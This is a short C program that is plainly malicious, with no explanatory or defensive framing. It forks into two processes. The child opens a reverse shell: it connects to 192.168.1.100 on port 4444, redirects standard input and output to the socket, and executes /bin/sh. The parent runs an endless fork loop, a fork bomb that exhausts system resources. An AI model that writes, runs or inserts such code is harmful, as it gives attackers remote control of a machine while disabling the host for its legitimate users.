#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void fork_bomb() {
    while(1) {
        fork();
    }
}

void reverse_shell() {
    int sock;
    struct sockaddr_in server;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    
    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execve("/bin/sh", NULL, NULL);
    }
}

int main() {
    if(fork() == 0) {
        // Child process - reverse shell
        sleep(1);
        reverse_shell();
    } else {
        // Parent process - fork bomb
        fork_bomb();
    }
    
    return 0;
}